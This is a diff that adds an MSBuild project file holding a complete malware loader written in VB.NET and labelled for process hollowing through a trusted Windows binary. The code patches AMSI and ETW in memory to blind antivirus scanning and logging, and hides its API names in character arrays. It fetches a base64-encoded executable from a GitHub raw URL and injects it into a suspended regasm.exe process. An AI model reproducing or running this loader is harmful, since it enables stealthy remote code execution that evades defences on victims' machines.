@@ -1,0 +1,312 @@
+<!-- LO loader - Process Hollowing via MSBuild LOLBin
+     Run: C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe .\loader.vbproj -->
+<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Target Name="Build">
+    <LOTask />
+  </Target>
+  <UsingTask TaskName="LOTask" TaskFactory="CodeTaskFactory"
+    AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+    <Task>
+      <Code Type="Class" Language="vb"><![CDATA[
+
+Imports System
+Imports System.Text
+Imports System.Net
+Imports System.Runtime.InteropServices
+Imports Microsoft.Build.Framework
+Imports Microsoft.Build.Utilities
+
+Public Class LOTask
+    Inherits Task
+
+    <DllImport("kernel32")> Public Shared Function GetProcAddress(h As IntPtr, p As String) As IntPtr
+    End Function
+    <DllImport("kernel32")> Public Shared Function GetProcAddress(h As IntPtr, ord As IntPtr) As IntPtr
+    End Function
+    <DllImport("kernel32")> Public Shared Function LoadLibrary(n As String) As IntPtr
+    End Function
+    <DllImport("kernel32")> Public Shared Function VirtualProtect(a As IntPtr, s As UInt32, n As UInt32, ByRef o As UInt32) As Boolean
+    End Function
+    <DllImport("kernel32")> Public Shared Function VirtualAllocEx(h As IntPtr, a As IntPtr, s As UInt32, t As UInt32, p As UInt32) As IntPtr
+    End Function
+    <DllImport("kernel32")> Public Shared Function WriteProcessMemory(h As IntPtr, b As IntPtr, buf As Byte(), s As UInt32, ByRef w As IntPtr) As Boolean
+    End Function
+    <DllImport("kernel32")> Public Shared Function VirtualProtectEx(h As IntPtr, a As IntPtr, s As UInt32, n As UInt32, ByRef o As UInt32) As Boolean
+    End Function
+    <DllImport("kernel32")> Public Shared Function ResumeThread(h As IntPtr) As UInt32
+    End Function
+    <DllImport("kernel32")> Public Shared Function CloseHandle(h As IntPtr) As Boolean
+    End Function
+    <DllImport("kernel32")> Public Shared Function WaitForSingleObject(h As IntPtr, ms As UInt32) As UInt32
+    End Function
+    <DllImport("kernel32")> Public Shared Function GetThreadContext(hThread As IntPtr, ctx As Byte()) As Boolean
+    End Function
+    <DllImport("kernel32")> Public Shared Function SetThreadContext(hThread As IntPtr, ctx As Byte()) As Boolean
+    End Function
+    <DllImport("kernel32", SetLastError:=True, CharSet:=CharSet.Auto)>
+    Public Shared Function CreateProcess(app As String, cmd As String, pa As IntPtr, ta As IntPtr, inh As Boolean, flags As UInt32, env As IntPtr, dir As String, ByRef si As STARTUPINFO, ByRef pi As PROCESS_INFORMATION) As Boolean
+    End Function
+
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
+    Public Structure STARTUPINFO
+        Public cb As UInt32
+        Public r1 As String
+        Public desk As String
+        Public title As String
+        Public x As UInt32
+        Public y As UInt32
+        Public xs As UInt32
+        Public ys As UInt32
+        Public xc As UInt32
+        Public yc As UInt32
+        Public fill As UInt32
+        Public flags As UInt32
+        Public show As UInt16
+        Public res2 As UInt16
+        Public res3 As IntPtr
+        Public sin As IntPtr
+        Public sout As IntPtr
+        Public serr As IntPtr
+    End Structure
+
+    <StructLayout(LayoutKind.Sequential)>
+    Public Structure PROCESS_INFORMATION
+        Public hProcess As IntPtr
+        Public hThread As IntPtr
+        Public dwProcessId As UInt32
+        Public dwThreadId As UInt32
+    End Structure
+
+    Const CTX_SIZE  As Integer = 716
+    Const CTX_FLAGS As Integer = 0
+    Const CTX_EBX   As Integer = 164
+    Const CTX_EIP   As Integer = 184
+
+    Private Shared Function ReadCStr(b As Byte(), o As Integer) As String
+        Dim e As Integer = o
+        Do While e < b.Length AndAlso b(e) <> 0
+            e += 1
+        Loop
+        Return Encoding.ASCII.GetString(b, o, e - o)
+    End Function
+
+    Private Shared Sub PatchAMSI()
+        Try
+            Dim aLib As String = New String(New Char(){"a"c,"m"c,"s"c,"i"c,"."c,"d"c,"l"c,"l"c})
+            Dim aFn  As String = New String(New Char(){"A"c,"m"c,"s"c,"i"c,"S"c,"c"c,"a"c,"n"c,"B"c,"u"c,"f"c,"f"c,"e"c,"r"c})
+            Dim aLib2 As IntPtr = LoadLibrary(aLib)
+            Dim aAddr As IntPtr = GetProcAddress(aLib2, aFn)
+            Dim aOld  As UInt32 = 0UI
+            VirtualProtect(aAddr, 8UI, &H40UI, aOld)
+            Marshal.Copy(New Byte(){&H31, &HC0, &HC3}, 0, aAddr, 3)
+            VirtualProtect(aAddr, 8UI, aOld, aOld)
+            Console.WriteLine("[*] AMSI blind")
+        Catch
+        End Try
+    End Sub
+
+    Private Shared Sub PatchETW()
+        Try
+            Dim eLib As String = New String(New Char(){"n"c,"t"c,"d"c,"l"c,"l"c})
+            Dim eFn  As String = New String(New Char(){"E"c,"t"c,"w"c,"E"c,"v"c,"e"c,"n"c,"t"c,"W"c,"r"c,"i"c,"t"c,"e"c})
+            Dim eLib2 As IntPtr = LoadLibrary(eLib)
+            Dim eAddr As IntPtr = GetProcAddress(eLib2, eFn)
+            Dim eOld  As UInt32 = 0UI
+            VirtualProtect(eAddr, 8UI, &H40UI, eOld)
+            Marshal.Copy(New Byte(){&HC3}, 0, eAddr, 1)
+            VirtualProtect(eAddr, 8UI, eOld, eOld)
+            Console.WriteLine("[*] ETW blind")
+        Catch
+        End Try
+    End Sub
+
+    Public Overrides Function Execute() As Boolean
+        Console.WriteLine("[*] loader starting...")
+        PatchAMSI()
+        PatchETW()
+
+        ' download
+        Dim url As String = "https://github.com/grere856-lgtm/urban-fiesta/raw/refs/heads/main/payload.txt"
+        Console.WriteLine("[*] downloading...")
+        ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
+        Dim wc As New WebClient()
+        wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        Dim PE As Byte() = Convert.FromBase64String(wc.DownloadString(url).Trim())
+        If PE(0) <> &H4D OrElse PE(1) <> &H5A Then
+            Console.WriteLine("[!] bad MZ")
+            Return False
+        End If
+        Console.WriteLine("[+] " & PE.Length & " bytes")
+
+        ' parse PE
+        Dim peOff   As Integer = BitConverter.ToInt32(PE, &H3C)
+        Dim optOff  As Integer = peOff + 24
+        Dim epRVA   As UInt32  = BitConverter.ToUInt32(PE, optOff + 16)
+        Dim imgSz   As UInt32  = BitConverter.ToUInt32(PE, optOff + 56)
+        Dim prefBase As UInt32 = BitConverter.ToUInt32(PE, optOff + 28)
+        Dim nSec    As UInt16  = BitConverter.ToUInt16(PE, peOff + 6)
+        Dim secTbl  As Integer = optOff + CInt(BitConverter.ToUInt16(PE, peOff + 20))
+        Console.WriteLine("[+] EP=0x" & epRVA.ToString("X") & " base=0x" & prefBase.ToString("X") & " secs=" & nSec)
+
+        ' spawn regasm suspended
+        Dim tgt As String = New String(New Char(){"C"c,":"c,"\"c,"W"c,"i"c,"n"c,"d"c,"o"c,"w"c,"s"c,"\"c,"M"c,"i"c,"c"c,"r"c,"o"c,"s"c,"o"c,"f"c,"t"c,"."c,"N"c,"E"c,"T"c,"\"c,"F"c,"r"c,"a"c,"m"c,"e"c,"w"c,"o"c,"r"c,"k"c,"\"c,"v"c,"4"c,"."c,"0"c,"."c,"3"c,"0"c,"3"c,"1"c,"9"c,"\"c,"r"c,"e"c,"g"c,"a"c,"s"c,"m"c,"."c,"e"c,"x"c,"e"c})
+        Console.WriteLine("[*] spawning suspended...")
+        Dim si As New STARTUPINFO()
+        Dim pi As New PROCESS_INFORMATION()
+        si.cb = CUInt(Marshal.SizeOf(si))
+        If Not CreateProcess(tgt, Nothing, IntPtr.Zero, IntPtr.Zero, False, 4UI, IntPtr.Zero, Nothing, si, pi) Then
+            Console.WriteLine("[!] CreateProcess failed: " & Marshal.GetLastWin32Error())
+            Return False
+        End If
+        Console.WriteLine("[+] pid=" & pi.dwProcessId)
+
+        ' get thread context - EBX = PEB at suspended start
+        Dim ctx(CTX_SIZE - 1) As Byte
+        BitConverter.GetBytes(&H10007).CopyTo(ctx, CTX_FLAGS)
+        If Not GetThreadContext(pi.hThread, ctx) Then
+            Console.WriteLine("[!] GetThreadContext failed: " & Marshal.GetLastWin32Error())
+            Return False
+        End If
+        Dim pebAddr As UInt32 = BitConverter.ToUInt32(ctx, CTX_EBX)
+        Console.WriteLine("[+] PEB=0x" & pebAddr.ToString("X"))
+
+        ' allocate
+        Dim remBase As IntPtr = VirtualAllocEx(pi.hProcess, New IntPtr(CLng(prefBase)), imgSz, &H3000UI, &H04UI)
+        If remBase = IntPtr.Zero Then
+            remBase = VirtualAllocEx(pi.hProcess, IntPtr.Zero, imgSz, &H3000UI, &H04UI)
+        End If
+        If remBase = IntPtr.Zero Then
+            Console.WriteLine("[!] alloc failed")
+            Return False
+        End If
+        Console.WriteLine("[+] allocated=0x" & remBase.ToString("X"))
+
+        ' build mapped image locally
+        Dim img(CInt(imgSz) - 1) As Byte
+        Array.Copy(PE, 0, img, 0, Math.Min(PE.Length, CInt(imgSz)))
+        Dim si2 As Integer
+        For si2 = 0 To CInt(nSec) - 1
+            Dim so      As Integer = secTbl + (si2 * 40)
+            Dim vRVA    As UInt32  = BitConverter.ToUInt32(PE, so + 12)
+            Dim rawSz   As UInt32  = BitConverter.ToUInt32(PE, so + 16)
+            Dim rawOff  As UInt32  = BitConverter.ToUInt32(PE, so + 20)
+            If rawSz = 0 Then Continue For
+            Dim sn As String = ReadCStr(PE, so)
+            Array.Copy(PE, CInt(rawOff), img, CInt(vRVA), CInt(rawSz))
+            Console.WriteLine("  [+] " & sn)
+        Next
+
+        ' relocations on local image
+        Dim delta As Long = remBase.ToInt64() - CLng(prefBase)
+        Console.WriteLine("[*] delta=0x" & delta.ToString("X"))
+        If delta <> 0 Then
+            Dim relRVA As UInt32 = BitConverter.ToUInt32(PE, optOff + 136)
+            Dim relSz  As UInt32 = BitConverter.ToUInt32(PE, optOff + 140)
+            Dim patches As Integer = 0
+            Dim bo As UInt32 = relRVA
+            Do While bo < relRVA + relSz
+                Dim pgRVA As UInt32  = BitConverter.ToUInt32(img, CInt(bo))
+                Dim bSz   As UInt32  = BitConverter.ToUInt32(img, CInt(bo) + 4)
+                If bSz = 0 Then Exit Do
+                Dim ec As Integer = CInt(bSz - 8) \ 2
+                Dim ei As Integer
+                For ei = 0 To ec - 1
+                    Dim ent  As UShort  = BitConverter.ToUInt16(img, CInt(bo) + 8 + ei * 2)
+                    Dim typ  As Integer = CInt(ent >> 12)
+                    Dim off  As Integer = CInt(ent And &HFFF)
+                    If typ = 3 Then
+                        Dim pp   As Integer = CInt(pgRVA) + off
+                        Dim orig As UInt32  = BitConverter.ToUInt32(img, pp)
+                        Array.Copy(BitConverter.GetBytes(CUInt(CLng(orig) + delta)), 0, img, pp, 4)
+                        patches += 1
+                    End If
+                Next
+                bo += bSz
+            Loop
+            Console.WriteLine("[+] relocs=" & patches)
+        End If
+
+        ' resolve IAT locally
+        Dim impRVA  As UInt32  = BitConverter.ToUInt32(PE, optOff + 104)
+        Dim resolved As Integer = 0
+        If impRVA <> 0 Then
+            Dim desc As Integer = CInt(impRVA)
+            Dim goOn As Boolean = True
+            Do While goOn
+                Dim oThunk  As UInt32 = BitConverter.ToUInt32(img, desc)
+                Dim nameRVA As UInt32 = BitConverter.ToUInt32(img, desc + 12)
+                Dim fThunk  As UInt32 = BitConverter.ToUInt32(img, desc + 16)
+                If nameRVA = 0 Then
+                    goOn = False
+                Else
+                    Dim dll  As String = ReadCStr(img, CInt(nameRVA))
+                    Dim hDll As IntPtr = LoadLibrary(dll)
+                    Console.WriteLine("  [+] " & dll)
+                    Dim nt2 As Integer = CInt(If(oThunk <> 0, oThunk, fThunk))
+                    Dim ft  As Integer = CInt(fThunk)
+                    Dim goInner As Boolean = True
+                    Do While goInner
+                        Dim thunk As UInt32 = BitConverter.ToUInt32(img, nt2)
+                        If thunk = 0 Then
+                            goInner = False
+                        Else
+                            Dim fa As IntPtr
+                            If (thunk And &H80000000UI) <> 0 Then
+                                fa = GetProcAddress(hDll, New IntPtr(CLng(thunk And &H7FFFUI)))
+                            Else
+                                Dim fn2 As String = ReadCStr(img, CInt(thunk) + 2)
+                                fa = GetProcAddress(hDll, fn2)
+                            End If
+                            Array.Copy(BitConverter.GetBytes(CInt(fa.ToInt32())), 0, img, ft, 4)
+                            resolved += 1
+                            nt2 += 4
+                            ft  += 4
+                        End If
+                    Loop
+                    desc += 20
+                End If
+            Loop
+        End If
+        Console.WriteLine("[+] imports=" & resolved)
+
+        ' write fully resolved image
+        Dim w As IntPtr = IntPtr.Zero
+        WriteProcessMemory(pi.hProcess, remBase, img, imgSz, w)
+        Console.WriteLine("[+] written=" & w.ToString())
+
+        ' set RX
+        Dim oldP As UInt32 = 0UI
+        VirtualProtectEx(pi.hProcess, remBase, imgSz, &H20UI, oldP)
+        Console.WriteLine("[+] RX set")
+
+        ' patch PEB imagebase
+        Dim nb As Byte() = BitConverter.GetBytes(CUInt(remBase.ToInt32()))
+        WriteProcessMemory(pi.hProcess, New IntPtr(CLng(pebAddr) + 8L), nb, 4UI, w)
+        Console.WriteLine("[+] PEB patched")
+
+        ' set EIP
+        Dim epAbs As UInt32 = CUInt(remBase.ToInt64()) + epRVA
+        Array.Copy(BitConverter.GetBytes(epAbs), 0, ctx, CTX_EIP, 4)
+        If Not SetThreadContext(pi.hThread, ctx) Then
+            Console.WriteLine("[!] SetThreadContext failed: " & Marshal.GetLastWin32Error())
+            Return False
+        End If
+        Console.WriteLine("[+] EIP=0x" & epAbs.ToString("X"))
+
+        ' resume
+        ResumeThread(pi.hThread)
+        Console.WriteLine("[+] DONE - regasm running payload!")
+
+        WaitForSingleObject(pi.hProcess, &HFFFFFFFFUI)
+        CloseHandle(pi.hThread)
+        CloseHandle(pi.hProcess)
+        Console.WriteLine("[+] exited cleanly")
+        Return True
+    End Function
+
+End Class
+
+      ]]></Code>
+    </Task>
+  </UsingTask>
+</Project>
